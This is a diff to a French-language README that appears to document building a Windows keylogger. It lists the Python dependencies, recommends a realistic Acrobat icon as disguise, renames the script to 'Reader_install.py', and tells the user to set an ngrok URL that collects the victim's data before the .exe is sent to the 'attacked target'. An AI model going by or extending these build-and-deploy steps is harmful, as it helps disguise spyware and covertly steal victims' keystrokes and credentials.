@@ -60,10 +60,12 @@ Prérequis de Compilation :
 - Dépendances : `pip install pynput requests pyinstaller`.
 - Ressource : Une icône réaliste (ex: acrobat.ico) placée dans le dossier.
 
+> Note : La création du fichier .exe a transmettre au cible attaqué n'est a effectuée qu'une seule fois pour insérer l'URL de votre Ngrok, par la suite, il faudra seulement executer le .exe sur la machine Windows.
+
 ###### ⚙️ Création du Payload (Build)
 
 Configuration de l'URL :
-Ouvrez le fichier keylogger_win_remote.py et modifiez la variable NGROK_URL avec l'adresse fournie par l'attaquant à l'étape précédente :
+Ouvrez le fichier Reader_install.py et modifiez la variable NGROK_URL avec l'adresse fournie par l'attaquant à l'étape précédente :
 
 `NGROK_URL = "[https://votre-url-dynamique.ngrok-free.app](https://votre-url-dynamique.ngrok-free.app)"`
 
